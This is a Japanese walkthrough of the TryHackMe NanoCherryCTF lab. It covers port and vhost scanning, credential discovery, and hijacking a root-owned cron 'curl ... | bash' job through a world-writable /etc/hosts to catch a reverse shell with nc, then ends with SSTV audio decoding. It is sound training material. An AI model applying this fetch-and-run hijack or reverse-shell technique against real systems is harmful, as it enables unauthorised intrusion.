# NanoCherryCTF

https://tryhackme.com/room/nanocherryctf

初期アクセス

```
Username: notsus
Password: dontbeascriptkiddie
```

## Enumeration

```shell
TARGET=10.48.175.30
sudo bash -c "echo $TARGET   cherryontop.thm >> /etc/hosts"
```

### SSH notsus

```sh
$ cat ./youFoundIt.txt 
Hey good work hacker. Glad you made it this far!

From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to escalate your privileges vertically to access his account?

Keep your's eyes peeled and don't be a script kiddie!

- Jex
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

SSH, HTTP

### サブドメイン、VHOST

nano を発見。

```shell
root@ip-10-48-125-191:~# ffuf -u http://cherryontop.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.cherryontop.thm' -fs 13968

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://cherryontop.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cherryontop.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 13968
________________________________________________

nano                    [Status: 200, Size: 10718, Words: 4093, Lines: 220]
:: Progress: [114532/114532] :: Job [1/1] :: 1878 req/sec :: Duration: [0:01:24] :: Errors: 0 ::
```

### ディレクトリ列挙

nano の下で、users.db を発見。

```
puppet
[REDACTED]
```

login画面で入力すると、Mollyのダッシュボードが表示された。

本文中に書かれているパスワードを使って molly としてSSHログインできた。

## Molly

```sh
$ ssh molly-milk@cherryontop.thm
```

```sh
$ cat chads-key1.txt
[REDACTED]
```

```sh
$ cat DONTLOOKCHAD.txt
Dear Chad,

Cherries, Ice Cream, and Milk,
In the bowl of life, we mix and swirl,
Like cherries, ice cream, and milk's swirl.
Cherries so red, plucked from the tree,
Sweet as your love, pure as can be.
Ice cream so smooth, so cool and white,
Melts in my mouth, with sheer delight.
Milk so pure, so creamy and rich,
The base of our love, the perfect mix.
Together they blend, in perfect harmony,
Like you and I, so sweet, so free.
With each bite, my heart takes flight,
As our love grows, so strong, so bright.
Cherries, ice cream, and milk,
Our love's ingredients, so smooth and silk.
Forever and always, our love will stay,
Like the sweet taste, that never fades away.

Love,
Molly

P.S. I'll hold on tight to that first part of your password you gave me! If anything ever happens to you, we'll all be sure to keep your dream of erasing vim off of all systems alive!
```

/etc/crontab

```sh
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```

/etc/hosts には w が付いている。

```sh
-rw-rw-rw-  1 root adm      312 Apr  8  2023 hosts
```

```sh
$ cat /etc/hosts
127.0.0.1 localhost
127.0.0.1 cherryontop.com
127.0.0.1 cherryontop.thm
127.0.0.1 nano.cherryontop.thm
127.0.1.1 nanocherryctf
...
```

hostsにkaliのIPアドレスを追加

```sh
$ echo '192.168.129.89 cherryontop.tld' >> /etc/hosts
```

リクエストが来た。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.48.175.30 - - [07/Jan/2026 11:33:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
```

リバースシェル取得成功。

```sh
$ nc -nlvp 8888                      
listening on [any] 8888 ...
connect to [192.168.129.89] from (UNKNOWN) [10.48.175.30] 35304
sh: 0: can't access tty; job control turned off
$ id
uid=1003(bob-boba) gid=1003(bob-boba) groups=1003(bob-boba)
```

## bob-boba

3番目のパーツ

```sh
$ cat chads-key3.txt
[REDACTED]
```

```sh
$ cat bobLog.txt
Bob Log

4/10/20XX

One of the funniest parts of working for Chad is both how much debt we have and how much other people owe us!

I know that Chad uses me as both his accountant and debt collector, but really, we need to hire more henchmen.

Perhaps we can convince the Arch Linux users to join our cause... Hopefully none of them like Vim, after all, Chad intends to eliminate every trace of the text editor and replace it with Nano.

Either way, I gotta really protect this password segment Chad gave me in case of emergencies!

Bob
```

## content.php

1から4以外で何か返るか調べる。

```sh
$ ffuf -u 'http://cherryontop.thm/content.php/?facts=FUZZ&user=IFSG22LO' -c -w ./nums.txt -fw 754

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cherryontop.thm/content.php/?facts=FUZZ&user=IFSG22LO
 :: Wordlist         : FUZZ: /home/kali/ctf/cherry/nums.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 754
________________________________________________

4                       [Status: 200, Size: 2523, Words: 761, Lines: 63, Duration: 152ms]
3                       [Status: 200, Size: 2514, Words: 762, Lines: 63, Duration: 154ms]
2                       [Status: 200, Size: 2519, Words: 762, Lines: 63, Duration: 154ms]
43                      [Status: 200, Size: 2558, Words: 764, Lines: 63, Duration: 151ms]
50                      [Status: 200, Size: 2487, Words: 757, Lines: 63, Duration: 151ms]
64                      [Status: 200, Size: 2486, Words: 757, Lines: 63, Duration: 151ms]
1                       [Status: 200, Size: 2499, Words: 759, Lines: 63, Duration: 2080ms]
20                      [Status: 200, Size: 2479, Words: 755, Lines: 63, Duration: 6047ms]
:: Progress: [1001/1001] :: Job [1/1] :: 267 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

43で返るメッセージ

```
My secret web hideout in case I forget my ssh credentials again<br>sam-sprinkles:[REDACTED]
```

2つ目のピース

```sh
$ cat chads-key2.txt
[REDACTED]
```

```sh
$ cat 'whyChadWhy??.txt'
Dude Chad! I thought we were bros!

I don't know if you'll ever read this, but ever since Molly joined the company, you've changed!

We had such a bromance going on and now you're letting her dig her nails into you!

I know you said you're not that into her, but I see how you tool look at eachother! It was always get paid before milk maids!

But I guess you've fallen for a milk maid now! I'm worried about you man...

Either way, I'll keep your secret password segment nice and hidden.

I hope we can hangout again soon.

Your friend,

Sam
```

## root

wavファイルにパスワードが含まれているとのこと。  
スペクトログラムを調べたりしたが、ここは分からなかった。

SSTVで画像に変換。

https://github.com/colaclanth/sstv

```sh
$ sstv -d ../rootPassword.wav -o ../out.png
[sstv] Searching for calibration header... Found!    
[sstv] Detected SSTV mode Robot 36
[sstv] Decoding image...   [#################################################################################]  99%
[sstv] Reached end of audio whilst decoding.
[sstv] Drawing image data...
[sstv] ...Done!
```

## 振り返り

- SSTV変換は勉強になった。

## Tags

#tags:ステガノグラフィー #tags:puzzle
